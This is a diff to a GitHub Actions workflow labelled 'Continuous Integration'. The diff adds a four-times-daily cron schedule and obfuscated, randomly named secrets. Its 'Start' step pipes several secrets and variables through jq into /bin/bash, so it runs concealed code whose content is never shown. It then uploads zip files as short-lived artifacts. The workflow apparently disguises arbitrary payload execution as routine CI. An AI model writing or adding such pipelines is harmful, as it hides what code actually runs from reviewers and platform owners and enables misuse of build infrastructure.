@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '48 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,16 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          gssl80355: ${{ secrets.gssl80355 }}
+          sktj76: ${{ secrets.sktj76 }}
         run: |
-          printf '%s' "$gssl80355" | jq -r .djmg4 | /bin/bash
-          printf '%s' "$vkxu7" | jq -r .kgl7392 | /bin/bash
-          echo $s6 | jq -r .b477 | /bin/bash
-          echo $rd23084 | jq -r .hqqj0 | /bin/bash
+          printf '%s' "$sktj76" | jq -r .ajlm8847 | /bin/bash
+          printf '%s' "$dwox75590" | jq -r .x92 | /bin/bash
+          echo $lne800 | jq -r .ull3 | /bin/bash
+          printf '%s' "$az7" | jq -r .gkk1019 | /bin/bash
+          echo $ns43702 | jq -r .d08232 | /bin/bash
+          echo $l2 | jq -r .giaf85 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: 4CwwtELC
+          name: giTMIXbW
           path: "*.zip"
           retention-days: 1
